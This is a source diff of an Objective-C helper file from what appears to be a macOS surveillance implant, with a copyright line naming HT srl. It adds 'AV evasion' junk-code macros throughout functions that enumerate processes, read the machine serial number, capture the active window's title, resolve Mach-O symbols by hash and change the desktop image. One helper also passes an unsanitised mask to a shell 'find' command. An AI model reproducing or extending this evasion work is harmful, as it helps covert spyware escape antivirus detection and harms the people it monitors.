@@ -7,7 +7,6 @@
  * Copyright (C) HT srl 2009. All rights reserved
  *
  */
-
 #import <objc/objc-class.h>
 
 #import <Carbon/Carbon.h>
@@ -27,6 +26,7 @@
 #import "RCSMDebug.h"
 #import "RCSMLogger.h"
 
+#include "RCSMAVGarbage.h"
 
 // Remember to md5 this
 #ifndef DEV_MODE
@@ -116,7 +116,10 @@ u_int gOSMinor  = 0;
 u_int gOSBugFix = 0;
 
 int getBSDProcessList(kinfo_proc **procList, size_t *procCount)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   int             err;
   kinfo_proc      *result;
   bool            done;
@@ -127,6 +130,9 @@ int getBSDProcessList(kinfo_proc **procList, size_t *procCount)
   
   result = NULL;
   done = false;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   do
     {
@@ -162,12 +168,18 @@ int getBSDProcessList(kinfo_proc **procList, size_t *procCount)
     }
   while (err == 0 && !done);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   // Clean up and establish post condition  
   if (err != 0 && result != NULL)
     {
       free(result);
       result = NULL;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   *procList = result; // will return the result as procList
   if (err == 0)
@@ -180,17 +192,26 @@ NSArray *obtainProcessList()
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   int i;
   kinfo_proc *allProcs = 0;
   size_t numProcs;
   NSString *procName;
   NSMutableArray *processList;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   int err =  getBSDProcessList(&allProcs, &numProcs);
   if (err)
     return nil;
   
   processList = [[NSMutableArray alloc] initWithCapacity: numProcs];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   for (i = 0; i < numProcs; i++)
     {
@@ -208,6 +229,9 @@ NSArray *obtainProcessList()
 
 NSArray *obtainProcessListWithPid()
 {
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
   int i;
@@ -215,11 +239,17 @@ NSArray *obtainProcessListWithPid()
   size_t numProcs;
   NSMutableArray *processList;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   int err =  getBSDProcessList(&allProcs, &numProcs);
   if (err)
     return nil;
   
   processList = [[NSMutableArray alloc] initWithCapacity: numProcs];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   for (i = 0; i < numProcs; i++)
     {
@@ -238,11 +268,17 @@ NSArray *obtainProcessListWithPid()
   free(allProcs);
   [outerPool release];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   return [processList autorelease];
 }
 
 BOOL findProcessWithName(NSString *aProcess)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
   NSArray *processList;
@@ -266,15 +302,24 @@ BOOL findProcessWithName(NSString *aProcess)
   
   [pool release];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   return NO;
 }
 
 NSNumber *pidForProcessName(NSString *aProcess)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSArray *processList;
   
   processList = obtainProcessListWithPid();
   [processList retain];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   for (NSDictionary *currentProcess in processList)
     {
@@ -295,7 +340,10 @@ NSNumber *pidForProcessName(NSString *aProcess)
 }
 
 BOOL isAddressOnLan(struct in_addr ipAddress)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   struct ifaddrs *iface, *ifacesHead;
   
   //
@@ -326,6 +374,9 @@ BOOL isAddressOnLan(struct in_addr ipAddress)
 #endif
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   return FALSE;
 }
 
@@ -333,7 +384,10 @@ BOOL isAddressAlreadyDetected(NSString *ipAddress,
                               int aPort,
                               NSString *netMask,
                               NSMutableArray *ipDetectedList)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSEnumerator *enumerator = [ipDetectedList objectEnumerator];
   id anObject;
   
@@ -349,13 +403,19 @@ BOOL isAddressAlreadyDetected(NSString *ipAddress,
         }
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   return FALSE;
 }
 
 BOOL compareIpAddress(struct in_addr firstIp,
                       struct in_addr secondIp,
                       u_long netMask)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   struct ifaddrs *iface, *ifacesHead;
   u_long ip1, ip2;
   
@@ -387,11 +447,17 @@ BOOL compareIpAddress(struct in_addr firstIp,
 #endif
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   return FALSE;
 }
 
 NSString *getHostname()
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSProcessInfo *processInfo = [NSProcessInfo processInfo];
   NSString *hostName = [processInfo hostName];
 
@@ -404,7 +470,10 @@ NSString *getHostname()
 // http://developer.apple.com/mac/library/technotes/tn/tn1103.html
 //
 void getSystemSerialNumber(CFStringRef *serialNumber)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   if (serialNumber != NULL)
     {
       *serialNumber = NULL;
@@ -425,11 +494,16 @@ void getSystemSerialNumber(CFStringRef *serialNumber)
           
           IOObjectRelease(platformExpert);
         }
-    }
+    }  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
 }
 
 int matchPattern(const char *source, const char *pattern)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   if (source == NULL || pattern == NULL)
     {
       return 0;
@@ -439,6 +513,9 @@ int matchPattern(const char *source, const char *pattern)
   verboseLog(@"source : %s", source);
   verboseLog(@"pattern: %s", pattern);
 #endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   for (;;)
     {
@@ -481,6 +558,9 @@ int matchPattern(const char *source, const char *pattern)
       source++;
       pattern++;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
 }
 
 NSArray *searchForProtoUpload(NSString *aFileMask)
@@ -528,7 +608,10 @@ NSArray *searchForProtoUpload(NSString *aFileMask)
 }
 
 NSArray *searchFile(NSString *aFileMask)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   FILE *fp;
   char path[1035];
   NSMutableArray *fileFound = [[NSMutableArray alloc] init];
@@ -537,7 +620,13 @@ NSArray *searchFile(NSString *aFileMask)
 #endif
   NSString *commandString = [NSString stringWithFormat: @"/usr/bin/find %@", aFileMask];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   fp = popen([commandString cStringUsingEncoding: NSUTF8StringEncoding], "r");
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   if (fp == NULL)
     {
@@ -548,6 +637,9 @@ NSArray *searchFile(NSString *aFileMask)
       [fileFound release];
       return nil;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   while (fgets(path, sizeof(path) - 1, fp) != NULL)
     {
@@ -564,12 +656,18 @@ NSArray *searchFile(NSString *aFileMask)
 #endif
   pclose(fp);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   return [fileFound autorelease];
 }
 
 static unsigned int
 sdbm(unsigned char *str)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   unsigned int hash = 0;
   int c;
   
@@ -581,7 +679,10 @@ sdbm(unsigned char *str)
 
 unsigned int
 findSymbolInFatBinary(void *imageBase, unsigned int symbolHash)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
 #ifdef DEBUG
   printf("[ii] findSymbolInFatBinary!\n");
 #endif
@@ -598,6 +699,9 @@ findSymbolInFatBinary(void *imageBase, unsigned int symbolHash)
   struct segment_command *seg_command = NULL;
   struct fat_header *f_header         = NULL;
   struct fat_arch *f_arch             = NULL;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   char *symbolName = NULL;
   
@@ -617,6 +721,9 @@ findSymbolInFatBinary(void *imageBase, unsigned int symbolHash)
   printf("[ii] nFatArch: %d\n", nfat);
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   for (i = 0; i < nfat; i++)
     {
       f_arch = imageBase + offset;
@@ -630,6 +737,9 @@ findSymbolInFatBinary(void *imageBase, unsigned int symbolHash)
   
   if (f_arch == NULL)
     return -1;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   x86Offset = SWAP_LONG (f_arch->offset);
 #ifdef DEBUG
@@ -647,6 +757,9 @@ findSymbolInFatBinary(void *imageBase, unsigned int symbolHash)
 #ifdef DEBUG
   printf("[ii] ncmdsFat: %d\n", mh_header->ncmds);
 #endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   for (i = 0; i < mh_header->ncmds; i++)
     {
@@ -683,7 +796,10 @@ findSymbolInFatBinary(void *imageBase, unsigned int symbolHash)
         
       offset += l_command->cmdsize;
     }
-      
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if (sym_command != NULL)
     {
       symbolOffset = x86Offset + sym_command->symoff;
@@ -700,6 +816,9 @@ findSymbolInFatBinary(void *imageBase, unsigned int symbolHash)
   printf("[ii] nSymsFat: %d\n", sym_command->nsyms);
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   for (i = 0; i < sym_command->nsyms; i++)
     {
       sym_nlist = (struct nlist *)(imageBase + symbolOffset);
@@ -709,7 +828,10 @@ findSymbolInFatBinary(void *imageBase, unsigned int symbolHash)
         {
           continue;
         }
-    
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       symbolName  = (char *)(imageBase + sym_nlist->n_un.n_strx + stringOffset);
       hash = sdbm ((unsigned char *)symbolName);
       
@@ -733,7 +855,10 @@ findSymbolInFatBinary(void *imageBase, unsigned int symbolHash)
 
 uint64_t
 findSymbolInFatBinary64(void *imageBase, unsigned int symbolHash)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
 #ifdef DEBUG
   infoLog(@"[ii] findSymbolInFatBinary64\n");
 #endif
@@ -753,6 +878,9 @@ findSymbolInFatBinary64(void *imageBase, unsigned int symbolHash)
   
   char *symbolName = NULL;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   int offset, symbolOffset, stringOffset, x86Offset, i, found, nfat;
   
   unsigned int linkeditHash = 0xf51f49c4; // "__LINKEDIT" sdbm hashed
@@ -768,6 +896,9 @@ findSymbolInFatBinary64(void *imageBase, unsigned int symbolHash)
   infoLog(@"[ii] magic: %x\n", f_header->magic);
   infoLog(@"[ii] nfat arch: %d\n", nfat);
 #endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   for (i = 0; i < nfat; i++)
     {
@@ -788,6 +919,9 @@ findSymbolInFatBinary64(void *imageBase, unsigned int symbolHash)
   printf ("[ii] x86_64 offset: %x\n", x86Offset);
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   offset = x86Offset;
   mh_header = (struct mach_header_64 *)(imageBase + offset); 
   offset += sizeof (struct mach_header_64);
@@ -800,6 +934,9 @@ findSymbolInFatBinary64(void *imageBase, unsigned int symbolHash)
   infoLog(@"[ii] ncmdsFat: %d\n", mh_header->ncmds);
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   for (i = 0; i < mh_header->ncmds; i++)
     {
       l_command = imageBase + offset; 
@@ -807,6 +944,9 @@ findSymbolInFatBinary64(void *imageBase, unsigned int symbolHash)
 #ifdef DEBUG
       infoLog(@"[ii] cmdFat: %d\n", l_command->cmd);
 #endif
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
       
       if (l_command->cmd == LC_SEGMENT)
         {
@@ -835,7 +975,10 @@ findSymbolInFatBinary64(void *imageBase, unsigned int symbolHash)
         
       offset += l_command->cmdsize;
     }
-      
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if (sym_command != NULL)
     {
       symbolOffset = x86Offset + sym_command->symoff;
@@ -851,6 +994,9 @@ findSymbolInFatBinary64(void *imageBase, unsigned int symbolHash)
   infoLog(@"[ii] stringOffsetFat: %x\n", stringOffset);
   infoLog(@"[ii] nSymsFat: %d\n", sym_command->nsyms);
 #endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   for (i = 0; i < sym_command->nsyms; i++)
     {
@@ -880,12 +1026,18 @@ findSymbolInFatBinary64(void *imageBase, unsigned int symbolHash)
         }
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   return -1;
 }
 
 #ifdef DEBUG_LOG
 void printFormatFlags(AudioStreamBasicDescription inDescription)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   const char *theEndianString = NULL;
   bool inAbbreviate = TRUE;
   
@@ -902,6 +1054,9 @@ void printFormatFlags(AudioStreamBasicDescription inDescription)
 #endif
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   const char* theKindString = NULL;
   if ((inDescription.mFormatFlags & kAudioFormatFlagIsFloat) != 0)
     {
@@ -915,6 +1070,9 @@ void printFormatFlags(AudioStreamBasicDescription inDescription)
     {
       theKindString = (inAbbreviate ? "UInt" : "Unsigned Integer");
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   const char* thePackingString = NULL;
   if ((inDescription.mFormatFlags & kAudioFormatFlagIsPacked) == 0)
@@ -939,6 +1097,9 @@ void printFormatFlags(AudioStreamBasicDescription inDescription)
       theMixabilityString = "Unmixable";
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   if ((inDescription.mFormatFlags & kAudioFormatFlagIsNonInterleaved) == 0)
     {
       theMixabilityString = "Interleaved";
@@ -947,6 +1108,10 @@ void printFormatFlags(AudioStreamBasicDescription inDescription)
     {
       theMixabilityString = "Non-Interleaved";
     }
+  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   if (inAbbreviate)
     {
@@ -1019,7 +1184,10 @@ void printFormatFlags(AudioStreamBasicDescription inDescription)
 #endif
 
 size_t _utf16len(unichar *string)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   size_t len;
   
   unichar *p = string;
@@ -1031,7 +1199,10 @@ size_t _utf16len(unichar *string)
 }
 
 NSDictionary *getActiveWindowInfo()
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   ProcessSerialNumber psn = { 0,0 };
   NSDictionary *activeAppInfo;
   
@@ -1045,6 +1216,9 @@ NSDictionary *getActiveWindowInfo()
   NSString *processName = nil;
   NSString *windowName  = nil;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   // Active application on workspace
   activeAppInfo =  [[NSWorkspace sharedWorkspace] activeApplication];
   psn.highLongOfPSN = [[activeAppInfo valueForKey: @"NSApplicationProcessSerialNumberHigh"]
@@ -1056,12 +1230,18 @@ NSDictionary *getActiveWindowInfo()
   if ((success = GetProcessPID(&psn, &pid)) != 0)
     return nil;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   // Window list front to back
   windowsList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenAboveWindow,
                                            kCGNullWindowID);
   
   if (windowsList == NULL)
     return nil;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   for (NSMutableDictionary *entry in (NSArray *)windowsList)
     {
@@ -1078,6 +1258,9 @@ NSDictionary *getActiveWindowInfo()
     }
   
   CFRelease(windowsList);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   if (windowPID != pid)
     {
@@ -1107,6 +1290,9 @@ NSDictionary *getActiveWindowInfo()
   infoLog(@"windowInfo: %@", windowInfo);
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   [windowID release];
   [processName release];
   [windowName release];
@@ -1115,7 +1301,10 @@ NSDictionary *getActiveWindowInfo()
 }
 
 BOOL is64bitKernel()
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   struct utsname un;
   int res = uname(&un);
   if (res == -1)
@@ -1133,6 +1322,9 @@ BOOL is64bitKernel()
   //char machine_i386[]   = "i386";
   char machine_x86_64[] = "x86_64";
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if (strncmp(un.machine, machine_x86_64, strlen(machine_x86_64)) == 0)
     {
       return YES;
@@ -1145,10 +1337,16 @@ BOOL is64bitKernel()
 
 // FIXED-
 void changeDesktopBg(NSString *aFilePath, BOOL wantToRestoreOriginal)
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSURL *image;
   NSURL *origImageUrl;
   NSWorkspace *sws = [NSWorkspace sharedWorkspace];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   if (wantToRestoreOriginal)
     {
@@ -1167,11 +1365,17 @@ void changeDesktopBg(NSString *aFilePath, BOOL wantToRestoreOriginal)
     
   NSError *err = nil;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   for (NSScreen *screen in [NSScreen screens]) 
     {
       NSDictionary *opt = [sws desktopImageOptionsForScreen:screen];        
       [sws setDesktopImageURL:image forScreen:screen options:opt error:&err];
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   if (wantToRestoreOriginal == NO)
     gOriginalDesktopImage = origImageUrl;
